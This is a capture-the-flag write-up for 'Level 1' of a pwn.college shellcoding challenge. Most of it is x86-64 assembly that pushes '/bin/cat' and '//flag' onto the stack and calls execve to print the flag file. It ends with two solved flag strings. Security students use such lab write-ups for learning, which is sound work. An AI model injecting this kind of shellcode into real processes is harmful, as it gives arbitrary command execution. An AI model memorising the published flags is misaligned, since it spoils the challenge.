# Level 1

This challenge seems to have no restrictions, perhaps is the size but 0x4000 is extremelly high to be a constraint tho xD <br>

This could've been done several ways, i just used execve to call cat on the flag file <br>

- since flag was at the root directory, prepended with **/** to maintain stack aligned (this is allowed in linux)

```assembly
.global _start
_start:
.intel_syntax noprefix
    # int3 # to debug

	xor rax,rax
	push rax                    # null byte
	
arraybuilder: # right to left
	mov rdx, 0x67616c662f2f2f2f # ////flag reversed
	push rdx
	mov rdx, rsp
	push rax                    # null byte
	
	# store argv[0] -> cat
	mov rdi, 0x7461632f6e69622f # /bin/cat reversed
	push rdi
	mov rdi, rsp
	push rax                    # null byte

setregisters:
	push rdx                    # argv[1]
	push rdi                    # argv[0]
	
dosyscall:
	mov rsi, rsp                # argv **
	xor rdx,rdx                 # null envp
	add rax, 0x3b               # execve syscall index
	syscall

# Flag for teaching challenge -> pwn_college{A5TLoc-81Kcc3xGPcVXnvg_w3iH.QXxATMsQjNxIzW}
# Flag for testing challenge -> pwn_college{0YXOfsP5dgQkeEl0WcdpxPFAe7C.QXyATMsQjNxIzW}
```